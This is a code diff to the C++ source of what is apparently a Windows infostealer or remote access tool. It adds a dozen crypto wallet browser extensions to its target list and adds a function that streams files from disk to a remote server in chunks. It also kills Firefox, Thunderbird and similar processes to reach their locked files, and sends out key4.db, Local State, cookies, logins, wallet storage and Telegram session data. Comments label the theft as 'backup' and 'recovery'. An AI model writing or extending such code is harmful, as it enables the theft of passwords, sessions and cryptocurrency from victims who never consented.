@@ -61,7 +61,17 @@ static std::vector<WalletMetadata> target_wallets = {
     {"okx", "mcohilncbfahbmgjoneonackghpdicob", "{787493a7-5847-497d-9471-a47732a32c28}", "okx"},
     {"solflare", "bhhhlbcehoolilbegeoponakbbdbiobo", "{dfc60534-1188-466d-965a-074495e4e84b}", "solflare"},
     {"backpack", "mclkkofklkfljcocclehcocbeccpkabi", "{a6575191-c426-4074-b5b6-7c3e34b56834}", "backpack"},
-    {"keplr", "dmkamcknogkgcdfhhbddcghachkejeap", "{9c22822a-f925-4672-8809-f001e3e7f411}", "keplr"}
+    {"keplr", "dmkamcknogkgcdfhhbddcghachkejeap", "{9c22822a-f925-4672-8809-f001e3e7f411}", "keplr"},
+    {"martian", "efmglhpocpbbihfygbgejocbeaffnmod", "{6e3d2427-0c7f-477d-8f92-5915d3153549}", "martian"},
+    {"petra", "jojhbbmabnpeboocneocalljenhkeepi", "{56722f46-0c84-486d-978a-78488d9e7943}", "petra"},
+    {"pontem", "phkbamefinggnoigpimgmokeakemreci", "{9663731a-e975-455b-b997-6a987d35368a}", "pontem"},
+    {"fewcha", "ebfidppbeooaoakaookpbocchiaceanj", "{3efd779b-59d4-469b-980b-9844e1355c3c}", "fewcha"},
+    {"ethos", "mcoccljfhakemfelkkkaobgekgeaacgl", "{65476a26-3720-4e5c-a570-5825244a141a}", "ethos"},
+    {"argent", "dlclbojjmmgnbhgfcenadocglpdnkbgb", "{d507119e-e374-4b5c-8b83-a0e28e12ec68}", "argent"},
+    {"braavos", "jnlgamecbpmbbadndmglpalknabbldpm", "{a823f66c-5953-4886-905c-df347432e185}", "braavos"},
+    {"exodus", "aholpfdialjgikkjbneafjmjbnebmbhj", "exodus-addon@exodus.io", "exodus"},
+    {"tronlink", "ibnejdfjmmkpcnlebbpgnleoln", "ibnejdfjmmkpcnlebbpgnleoln", "tronlink"},
+    {"ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec", "{5305f884-6997-4081-8b27-5d51e70a316b}", "ronin"}
 };
 
 bool send_file_to_server(SOCKET sock, const std::string& relPath, const std::vector<uint8_t>& data) {
@@ -115,19 +125,92 @@ bool send_file_to_server(SOCKET sock, const std::string& relPath, const std::vec
     return true;
 }
 
+bool send_file_from_disk(SOCKET sock, const fs::path& file_path, const std::string& server_path) {
+    if (!g_running || sock == INVALID_SOCKET || !fs::exists(file_path)) return false;
+
+    // Use a temporary copy if the file is likely locked
+    fs::path target_path = file_path;
+    bool is_temp = false;
+
+    // Some files are notoriously locked by browsers
+    std::string filename = to_lower(file_path.filename().string());
+    std::string ext = to_lower(file_path.extension().string());
+    if (filename == "cookies.sqlite" || filename == "logins.json" || filename == "places.sqlite" || filename == "web data" || ext == ".ldb" || ext == ".log" || ext == ".sqlite") {
+        wchar_t temp_path[MAX_PATH], temp_file[MAX_PATH];
+        if (GetTempPathW(MAX_PATH, temp_path) != 0 && GetTempFileNameW(temp_path, L"rat", 0, temp_file) != 0) {
+            if (fs::copy_file(file_path, temp_file, fs::copy_options::overwrite_existing)) {
+                target_path = temp_file;
+                is_temp = true;
+            }
+        }
+    }
+
+    std::ifstream ifs(target_path, std::ios::binary);
+    if (!ifs.is_open()) {
+        if (is_temp) fs::remove(target_path);
+        return false;
+    }
+
+    ifs.seekg(0, std::ios::end);
+    uint32_t totalDataSize = (uint32_t)ifs.tellg();
+    ifs.seekg(0, std::ios::beg);
+
+    uint32_t pathLen = (uint32_t)server_path.size();
+    const uint32_t CHUNK_SIZE = 512 * 1024; // 512KB chunks
+    std::vector<uint8_t> buffer(CHUNK_SIZE);
+    uint32_t offset = 0;
+
+    if (totalDataSize == 0) {
+        uint32_t payloadSize = sizeof(uint32_t) + pathLen + sizeof(uint32_t) + 0;
+        PacketHeader header = { PACKET_SIGNATURE, PACKET_TYPE_RECOVERY_FILE, payloadSize };
+        std::vector<uint8_t> packet(sizeof(PacketHeader) + payloadSize);
+        uint8_t* ptr = packet.data();
+        memcpy(ptr, &header, sizeof(PacketHeader)); ptr += sizeof(PacketHeader);
+        memcpy(ptr, &pathLen, sizeof(uint32_t)); ptr += sizeof(uint32_t);
+        memcpy(ptr, server_path.c_str(), pathLen); ptr += pathLen;
+        uint32_t zero = 0;
+        memcpy(ptr, &zero, sizeof(uint32_t));
+        send(sock, (const char*)packet.data(), (int)packet.size(), 0);
+    } else {
+        while (offset < totalDataSize && g_running) {
+            uint32_t currentChunkSize = (totalDataSize - offset > CHUNK_SIZE) ? CHUNK_SIZE : (totalDataSize - offset);
+            ifs.read((char*)buffer.data(), currentChunkSize);
+
+            uint32_t payloadSize = sizeof(uint32_t) + pathLen + sizeof(uint32_t) + currentChunkSize;
+            PacketHeader header = { PACKET_SIGNATURE, PACKET_TYPE_RECOVERY_FILE, payloadSize };
+            std::vector<uint8_t> packet(sizeof(PacketHeader) + payloadSize);
+            uint8_t* ptr = packet.data();
+            memcpy(ptr, &header, sizeof(PacketHeader)); ptr += sizeof(PacketHeader);
+            memcpy(ptr, &pathLen, sizeof(uint32_t)); ptr += sizeof(uint32_t);
+            memcpy(ptr, server_path.c_str(), pathLen); ptr += pathLen;
+            memcpy(ptr, &offset, sizeof(uint32_t)); ptr += sizeof(uint32_t);
+            memcpy(ptr, buffer.data(), currentChunkSize);
+
+            int remaining = (int)packet.size();
+            const char* p = (const char*)packet.data();
+            while (remaining > 0 && g_running) {
+                int sent = send(sock, p, remaining, 0);
+                if (sent <= 0) { g_running = false; break; }
+                p += sent; remaining -= sent;
+            }
+            offset += currentChunkSize;
+        }
+    }
+
+    ifs.close();
+    if (is_temp) fs::remove(target_path);
+    return true;
+}
+
 void send_directory_recursively(SOCKET sock, const fs::path& source_dir, const std::string& server_path_prefix) {
     if (!g_running || !fs::exists(source_dir)) return;
     std::error_code ec;
     for (const auto& entry : fs::recursive_directory_iterator(source_dir, ec)) {
         if (!g_running || ec) break;
         if (entry.is_regular_file()) {
-            std::ifstream ifs(entry.path(), std::ios::binary);
-            if (ifs) {
-                std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                std::string rel = fs::relative(entry.path(), source_dir).string();
-                std::replace(rel.begin(), rel.end(), '\\', '/');
-                send_file_to_server(sock, server_path_prefix + "/" + rel, data);
-            }
+            std::string rel = fs::relative(entry.path(), source_dir).string();
+            std::replace(rel.begin(), rel.end(), '\\', '/');
+            send_file_from_disk(sock, entry.path(), server_path_prefix + "/" + rel);
         }
     }
 }
@@ -261,6 +344,10 @@ void run_recovery(SOCKET sock) {
     kill_processes_by_name("chrome.exe");
     kill_processes_by_name("msedge.exe");
     kill_processes_by_name("brave.exe");
+    kill_processes_by_name("firefox.exe");
+    kill_processes_by_name("waterfox.exe");
+    kill_processes_by_name("librewolf.exe");
+    kill_processes_by_name("thunderbird.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
@@ -268,6 +355,10 @@ void run_recovery(SOCKET sock) {
              user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
         }
         if (user_data_dir.empty()) continue;
+
+        // Backup critical config files for manual recovery
+        fs::path user_data_path(user_data_dir);
+        send_file_from_disk(sock, user_data_path / "Local State", config.output_dir + "/Local State");
 
         std::vector<uint8_t> v10_key;
         bool is_dpapi = false;
@@ -970,6 +1061,10 @@ void extract_all_profiles_data(SOCKET sock, const std::vector<uint8_t>& v20_key,
                 if (fs::exists(entry.path() / "Preferences") || fs::exists(entry.path() / "Cookies") || fs::exists(entry.path() / "Network" / "Cookies") || fs::exists(entry.path() / "Ya Passman Data")) {
                     std::string profile_name = entry.path().filename().string();
                     std::string out_prefix = config.output_dir + "/" + profile_name;
+
+                // Backup profile config
+                send_file_from_disk(sock, entry.path() / "Preferences", out_prefix + "/Preferences");
+
                     extract_passwords(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
                     extract_cookies(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera, config.name, profile_name);
                     extract_autofill(sock, entry.path(), out_prefix, v10_key, v20_key, is_opera);
@@ -1195,34 +1290,54 @@ std::map<std::string, std::string> get_firefox_uuid_mappings(const fs::path& pro
     std::map<std::string, std::string> mappings;
 
     try {
-        // 1. Try extensions.json
+        // 1. Try extensions.json (comprehensive regex)
         fs::path ext_json_path = profile_path / "extensions.json";
         if (fs::exists(ext_json_path)) {
             std::ifstream ifs(ext_json_path);
             if (ifs.is_open()) {
                 std::string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                // Use a simpler regex to avoid potential backtracking issues with large files
-                std::regex re("\"id\"\\s*:\\s*\"([^\"]+)\"[^}]*?\"uuid\"\\s*:\\s*\"([^\"]+)\"");
-                auto words_begin = std::sregex_iterator(content.begin(), content.end(), re);
-                auto words_end = std::sregex_iterator();
-                for (std::sregex_iterator i = words_begin; i != words_end; ++i) {
-                    if ((*i).size() > 2) mappings[(*i)[1].str()] = (*i)[2].str();
+                // Use multiple specific regexes to capture mappings within extension objects
+                std::vector<std::string> patterns = {
+                    "\"id\"\\s*:\\s*\"([^\"]+)\"[^}]*?\"uuid\"\\s*:\\s*\"([^\"]+)\"",
+                    "\"uuid\"\\s*:\\s*\"([^\"]+)\"[^}]*?\"id\"\\s*:\\s*\"([^\"]+)\"",
+                    "\"addonID\"\\s*:\\s*\"([^\"]+)\"[^}]*?\"uuid\"\\s*:\\s*\"([^\"]+)\"",
+                    "\"uuid\"\\s*:\\s*\"([^\"]+)\"[^}]*?\"addonID\"\\s*:\\s*\"([^\"]+)\""
+                };
+
+                for (const auto& pat : patterns) {
+                    std::regex re(pat, std::regex_constants::optimize);
+                    auto words_begin = std::sregex_iterator(content.begin(), content.end(), re);
+                    auto words_end = std::sregex_iterator();
+                    for (std::sregex_iterator i = words_begin; i != words_end; ++i) {
+                        if ((*i).size() > 2) {
+                            // Determine which capture is the ID and which is the UUID based on the pattern
+                            if (pat.find("\"id\"") == 0 || pat.find("\"addonID\"") == 0) mappings[(*i)[1].str()] = (*i)[2].str();
+                            else mappings[(*i)[2].str()] = (*i)[1].str();
+                        }
+                    }
                 }
             }
         }
 
-        // 2. Try prefs.js (sometimes mappings are there too)
+        // 2. Try prefs.js (extensions.webextensions.uuids contains a JSON string)
         fs::path prefs_path = profile_path / "prefs.js";
         if (fs::exists(prefs_path)) {
             std::ifstream ifs(prefs_path);
             if (ifs.is_open()) {
                 std::string line;
-                std::regex re("extensions\\.webextensions\\.uuids\"\\s*,\\s*\"([^\"]+)\"");
+                // Match the line containing the UUID JSON object
+                std::regex re_pref("extensions\\.webextensions\\.uuids\"\\s*,\\s*\"(.*?)\"\\s*\\)");
                 while (std::getline(ifs, line)) {
                     std::smatch match;
-                    if (std::regex_search(line, match, re) && match.size() > 1) {
+                    if (std::regex_search(line, match, re_pref) && match.size() > 1) {
                         std::string json_part = match[1].str();
-                        // Basic unescape for the internal JSON-like string in prefs.js
+                        // Unescape double quotes in the JSON string inside prefs.js
+                        size_t start_pos = 0;
+                        while((start_pos = json_part.find("\\\"", start_pos)) != std::string::npos) {
+                            json_part.replace(start_pos, 2, "\"");
+                            start_pos += 1;
+                        }
+
                         std::regex inner_re("\"([^\"]+)\"\\s*:\\s*\"([^\"]+)\"");
                         auto words_begin = std::sregex_iterator(json_part.begin(), json_part.end(), inner_re);
                         auto words_end = std::sregex_iterator();
@@ -1233,60 +1348,87 @@ std::map<std::string, std::string> get_firefox_uuid_mappings(const fs::path& pro
                 }
             }
         }
-    } catch (...) {
-        // Suppress any regex errors or exceptions
-    }
+    } catch (...) {}
 
     return mappings;
 }
 
 void extract_firefox_wallets(SOCKET sock, const fs::path& profile_path, const std::string& browser_name, const std::string& profile_name) {
     try {
-    auto mappings = get_firefox_uuid_mappings(profile_path);
-    if (mappings.empty()) return;
+        auto mappings = get_firefox_uuid_mappings(profile_path);
 
-    std::string safe_browser = to_lower(browser_name);
-    std::replace(safe_browser.begin(), safe_browser.end(), ' ', '_');
+        std::string safe_browser = to_lower(browser_name);
+        std::replace(safe_browser.begin(), safe_browser.end(), ' ', '_');
 
-    for (const auto& wallet : target_wallets) {
-        std::string uuid = "";
-
-        // Match by ID
-        if (!wallet.firefox_id.empty() && mappings.count(wallet.firefox_id)) {
-            uuid = mappings[wallet.firefox_id];
-        }
-
-        // Fallback: search mappings for keyword if ID didn't match
-        if (uuid.empty() && !wallet.firefox_keyword.empty()) {
+        // Map of UUID -> Wallet Name
+        std::map<std::string, std::string> uuid_to_wallet;
+        for (const auto& wallet : target_wallets) {
+            if (!wallet.firefox_id.empty() && mappings.count(wallet.firefox_id)) {
+                uuid_to_wallet[mappings[wallet.firefox_id]] = wallet.name;
+            }
+            // Also try keyword matching against existing mappings
             for (const auto& m : mappings) {
-                if (to_lower(m.first).find(to_lower(wallet.firefox_keyword)) != std::string::npos) {
-                    uuid = m.second;
-                    break;
+                if (!wallet.firefox_keyword.empty() && to_lower(m.first).find(to_lower(wallet.firefox_keyword)) != std::string::npos) {
+                    uuid_to_wallet[m.second] = wallet.name;
                 }
             }
         }
 
-        if (!uuid.empty()) {
-            std::string wallet_prefix = "wallets/" + wallet.name + "_" + safe_browser + "/" + profile_name;
+        // Potential storage root directories in a Firefox profile
+        std::vector<std::string> storage_roots = {"storage/default", "storage/permanent", "extension-storage", "indexedDB", "Local Storage"};
 
-            // Search multiple possible storage locations
-            std::vector<std::string> sub_dirs = {
-                "storage/default/moz-extension+++" + uuid,
-                "storage/permanent/moz-extension+++" + uuid,
-                "extension-storage/" + uuid
-            };
+        for (const auto& root : storage_roots) {
+            fs::path root_path = profile_path / root;
+            if (!fs::exists(root_path)) continue;
 
-            for (const auto& sub : sub_dirs) {
-                fs::path full_path = profile_path / sub;
-                if (fs::exists(full_path)) {
-                    std::string folder_name = sub;
-                    std::replace(folder_name.begin(), folder_name.end(), '/', '_');
-                    std::replace(folder_name.begin(), folder_name.end(), ':', '_');
-                    send_directory_recursively(sock, full_path, wallet_prefix + "/" + folder_name);
+            std::error_code ec;
+            for (const auto& entry : fs::directory_iterator(root_path, ec)) {
+                if (ec) break;
+                if (!entry.is_directory()) continue;
+
+                std::string folder_name = entry.path().filename().string();
+                std::string folder_name_lower = to_lower(folder_name);
+                std::string uuid = "";
+
+                // Firefox storage folders usually start with "moz-extension+++" followed by the UUID
+                if (folder_name.find("moz-extension+++") == 0) {
+                    uuid = folder_name.substr(16);
+                } else {
+                    // Sometimes it's just the UUID or the UUID with some suffix like ^userContextId=
+                    uuid = folder_name;
+                }
+
+                // Clean up UUID (remove suffixes like ^userContextId=1)
+                size_t suffix_pos = uuid.find('^');
+                if (suffix_pos != std::string::npos) {
+                    uuid = uuid.substr(0, suffix_pos);
+                }
+
+                bool matched = false;
+                std::string wallet_name = "";
+
+                // 1. Direct UUID match
+                if (uuid_to_wallet.count(uuid)) {
+                    wallet_name = uuid_to_wallet[uuid];
+                    matched = true;
+                }
+                // 2. Heuristic match: check folder name for wallet keywords
+                else {
+                    for (const auto& wallet : target_wallets) {
+                        if (!wallet.firefox_keyword.empty() && folder_name_lower.find(to_lower(wallet.firefox_keyword)) != std::string::npos) {
+                            wallet_name = wallet.name;
+                            matched = true;
+                            break;
+                        }
+                    }
+                }
+
+                if (matched) {
+                    std::string wallet_prefix = "wallets/" + wallet_name + "_" + safe_browser + "/" + profile_name + "/" + root;
+                    send_directory_recursively(sock, entry.path(), wallet_prefix + "/" + folder_name);
                 }
             }
         }
-    }
     } catch (...) {}
 }
 
@@ -1303,6 +1445,12 @@ void extract_firefox_data(SOCKET sock, const BrowserConfig& config, const std::w
             if (entry.is_directory()) {
                 fs::path profile_path = entry.path(); if (fs::exists(profile_path / "cookies.sqlite") || fs::exists(profile_path / "logins.json")) {
                     std::string profile_name = profile_path.filename().string(); std::string out_prefix = config.output_dir + "/" + profile_name;
+
+                // Backup critical firefox files
+                send_file_from_disk(sock, profile_path / "prefs.js", out_prefix + "/prefs.js");
+                send_file_from_disk(sock, profile_path / "extensions.json", out_prefix + "/extensions.json");
+                send_file_from_disk(sock, profile_path / "key4.db", out_prefix + "/key4.db");
+
                     extract_firefox_cookies(sock, profile_path, out_prefix, config.name, profile_name); extract_firefox_history(sock, profile_path, out_prefix); extract_firefox_autofill(sock, profile_path, out_prefix);
                     if (!nss_dir.empty()) extract_firefox_passwords(sock, profile_path, out_prefix, nss_dir);
                     extract_firefox_wallets(sock, profile_path, config.name, profile_name);
@@ -1317,16 +1465,11 @@ void extract_telegram_session(SOCKET sock) {
         wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) != S_OK) return;
         fs::path tdata_path = fs::path(appdata) / L"Telegram Desktop" / L"tdata"; CoTaskMemFree(appdata);
         if (!fs::exists(tdata_path)) return;
-        auto send_tdata_file = [&](const fs::path& src) {
-            if (fs::exists(src)) {
-                std::ifstream ifs(src, std::ios::binary);
-                if (ifs.is_open()) {
-                    std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                    send_file_to_server(sock, "telegram session/tdata/" + src.filename().string(), data);
-                }
-            }
-        };
-        for (const auto& f : {"key_datas", "map0", "map1", "settingss"}) send_tdata_file(tdata_path / f);
+
+        const char* main_files[] = {"key_datas", "map0", "map1", "settingss"};
+        for (const char* f : main_files) {
+            send_file_from_disk(sock, tdata_path / f, "telegram session/tdata/" + std::string(f));
+        }
 
         std::error_code ec;
         for (const auto& entry : fs::directory_iterator(tdata_path, ec)) {
@@ -1340,11 +1483,7 @@ void extract_telegram_session(SOCKET sock) {
                         if (!sub_entry.is_directory()) {
                             std::string filename = sub_entry.path().filename().string();
                             if (filename.find(".log") == std::string::npos && filename.find("dumps") == std::string::npos) {
-                                std::ifstream ifs(sub_entry.path(), std::ios::binary);
-                                if (ifs.is_open()) {
-                                    std::vector<uint8_t> data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
-                                    send_file_to_server(sock, "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string(), data);
-                                }
+                                send_file_from_disk(sock, sub_entry.path(), "telegram session/tdata/" + folder_name + "/" + fs::relative(sub_entry.path(), entry.path()).string());
                             }
                         }
                     }
